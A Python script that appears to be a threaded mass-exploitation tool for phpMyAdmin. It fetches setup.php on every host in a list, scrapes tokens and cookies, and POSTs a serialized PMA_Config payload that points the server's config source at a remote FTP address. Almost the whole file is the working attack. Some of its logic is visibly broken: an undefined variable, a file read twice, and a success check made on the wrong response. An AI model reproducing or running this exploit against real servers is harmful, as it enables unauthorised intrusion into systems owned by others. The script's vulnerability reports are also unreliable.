#!/usr/bin/env python3

import sys
import os
import time
import queue
import threading
import requests, json
from termcolor import colored

print(colored("w00t w00t", 'cyan'))
with open(sys.argv[1]) as f:
	hosts = [line.rstrip() for line in f]
	count = 0
	lines_=f.readlines()
	for line_ in lines_:
		if any(word in line_ for word in words):
        		count+=1 
	print(count)

skids = int(sys.argv[2])
time_out = int(sys.argv[3])
q = queue.Queue()

class ThreadUrl(threading.Thread):
	
	def __init__(self, q):
		threading.Thread.__init__(self)
		self.q = q
		
	def run(self):
		while True:
			host = self.q.get()			
			if ("http://" in host):
				cgi = (host)
			else:
				cgi = ("http://" + ''.join(host) + "/phpmyadmin/scripts/setup.php")
			try:
				size = q.qsize()
				r = requests.get(cgi, stream=True, timeout=(time_out))
				gb = json.dumps(r.headers.__dict__['_store'])
				res = r.status_code
				
				if (r.status_code == requests.codes.ok):
				
					if ("phpMyAdmin" in r.text  and "token" in r.text and 'phpMyAdmin' in gb):
						er = r.text
						start = 'name="token" value="'
						end = '" /><'
						token_ = er.split(start)[1].split(end)[0]

						start = 'phpMyAdmin '
						end = ' setup'
						ver= er.split(start)[1].split(end)[0]
						
						rh = json.dumps(r.headers.__dict__['_store'])
						start = 'phpMyAdmin='
						end = '; path=/'
						cookies= rh.split(start)[1].split(end)[0]
						
						rh2 = json.dumps(r.headers.__dict__['_store'])
						start2 = 'Set-Cookie", "'

						end2 = '; expires='
						cookies2= rh2.split(start2)[1].split(end2)[0]
						
						ftp = "ftp://192.168.1.15.php"
						len_ = (len(ftp))
						ftpr0 = ftp.replace(".", "%2E")
						ftpr1 = ftpr0.replace(":", "%3A")
						ftpr = ftpr1.replace("/", "%2F")
						payload = f"action=lay_navigation&eoltype=unix&token={token_}&configuration=a%3A1%3A%7Bi%3A0%3BO%3A10%3A%22PMA%5FConfig%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A{len_}%3A%22{ftpr}%22%3B%7D%7D"
						
						Headers = {
						'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]',
						'Content-Type': 'application/x-www-form-urlencoded',
						'Referer': f'{cgi}',
						'Cookie': f'{cookies2}; {cookies}',
						'Connection': 'keep-alive',
						'Content-Length': '1000',
						}
						req = requests.post(cgi, headers=Headers, data=payload)
						time.sleep(1.5)
						post_ = r.raise_for_status()
							
						if (post_ == None):
							print(colored(f"[{size}] {cgi} | phpMyAdmin {ver}  [{lines_}]", 'green'))
							#f = open(f'P.txt', "a")
							#f.write(f"{cgi}\n")
							#f.close()
							self.q.task_done()
							pass
						else:
							print(colored(f"[{size}] {cgi} | Not Vulnerable", 'red'))
							self.q.task_done()
							pass
						
					else:
						print(colored(f"[{size}] | {cgi} | WRONG VERSION", 'red'))
						self.q.task_done()
						pass
				
				else:
					print(colored(f"[{size}] | {cgi} - {res}", 'red'))
					self.q.task_done()
					pass
				
			except requests.ConnectTimeout:
				print(colored(f"[{size}] | {cgi} - No Response", 'red'))
				self.q.task_done()

				pass
				
			except requests.ConnectionError:
				print(colored(f"[{size}] | {cgi} - Connection Error", 'red'))
				self.q.task_done()
				pass
				
			except requests.ReadTimeout:
				print(colored(f"[{size}] | {cgi} - Read Timeout", 'red'))
				self.q.task_done()
				pass

start = time.time()

def main():
	
		for i in range(skids):
			t = ThreadUrl(q)
			t.setDaemon(True)
			t.start()
			
		for host in hosts:
			q.put(host)
			
		q.join()
		
main()
print("Elapsed Time: %s" % (time.time() - start))
